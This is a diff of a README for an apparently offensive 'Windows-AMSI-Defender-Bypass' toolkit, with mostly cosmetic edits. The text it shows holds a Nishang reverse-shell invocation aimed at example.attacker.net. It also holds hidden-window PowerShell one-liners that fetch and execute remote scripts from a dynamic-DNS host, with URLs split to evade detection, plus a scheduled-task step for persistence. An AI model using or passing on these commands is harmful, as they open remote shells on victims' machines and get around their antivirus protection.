@@ -22,9 +22,9 @@ Getting the shell:
 -------------------
 nish.ps1: 
 -----------
-the TCP nishang that we always use from: https://github.com/samratashok/nishang/tree/master/Shells
+The TCP nishang that we always use from: https://github.com/samratashok/nishang/tree/master/Shells
 
-definning this at the end of the script
+Definning this at the end of the script:
 
 Invoke-PowerShellTcp -Reverse -IPAddress example.attacker.net -Port 443 
 
@@ -52,15 +52,16 @@ Every child process running from this powershell session is going to run without
 
 To add an extra
 -----------------
-we can make it all run as many time as we want by scheduling these Invokes-Expression's:
+We can make it all run as many time as we want by scheduling these Invokes-Expression's:
 
 sched.ps1:
 ----------
-You can modify this to run whenever you want, in (New-TimeSpan -Minutes 'minutes between each run')
+You can modify this to run whenever you want, in (New-TimeSpan -Minutes 'minutes between each run').
 
-so in this case you are going to run 2 Invokes:
-          
-          
+
+
+In this case you are going to run 2 Invokes:
+                    
 powershell -windowstyle hidden iex(new-object net.webclient).DownloadString('htt'+'p:/'+'/example.ddns.net:80/trigger.ps1')
 powershell -windowstyle hidden iex(new-object net.webclient).DownloadString('htt'+'p:/'+'/example.ddns.net:80/sched.ps1')
 
@@ -69,3 +70,19 @@ You can make only one call by creating another .ps1
 All of these scripts are goint to be in: 
 ----------------------------------------
 https://github.com/Filiplain/Windows-AMSI-Defender-Bypass
+
+Make sure to define your IP or Domain into the files
+And host a server where all the files are located
+
+
+Invokes Map:
+------------
+                                                                 
+
+                trigger.ps1                    
+              /            \
+          fail.ps1   ;  nish.ps1
+                                                       
+
+
+
